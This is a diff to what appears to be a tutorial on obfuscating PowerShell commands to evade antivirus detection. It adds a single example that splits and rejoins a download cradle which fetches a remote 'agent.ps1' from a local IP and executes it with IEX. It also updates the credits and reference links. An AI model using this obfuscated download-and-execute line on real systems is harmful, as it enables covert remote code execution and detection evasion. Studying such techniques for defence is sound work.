@@ -133,6 +133,10 @@ from $env:comspec variable and uses the **-Join''** operator to take the arraw a
 
 ![powershell obfuscation](http://i.cubeupload.com/Um9qJu.jpg)
 
+- Using an powershell variable ($cmdWithDelim) to **split** the system call and then **-Join** it back again
+
+      $cmdWithDelim = "(New-Object Net.We~~bClient).Downlo~~adString('http://192.168.1.71/agent.ps1')";IEX ($cmdWithDelim.Split("~~") -Join '') | IEX
+
 ---
 
 <br /><br /><br />
@@ -281,7 +285,8 @@ from $env:comspec variable and uses the **-Join''** operator to take the arraw a
 <br /><br /><br />
 
 ### Special thanks to:
-**@404death** **@Wandoelmo Silva** **@daniel sauder(avet)** **@Andy Green**
+**@danielbohannon** **@Andy Green** **@404death**<br />
+**@Wandoelmo Silva** **@daniel sauder(avet)**
 
 <br />
 
@@ -290,6 +295,7 @@ from $env:comspec variable and uses the **-Join''** operator to take the arraw a
 https://twitter.com/404death<br />
 https://github.com/govolution/avepoc<br />
 https://github.com/danielbohannon/Invoke-Obfuscation<br />
+https://www.sans.org/summit-archives/file/summit-archive-1492186586.pdf<br />
 https://blog.varonis.com/powershell-obfuscation-stealth-through-confusion-part-i/<br />
 
 <br />
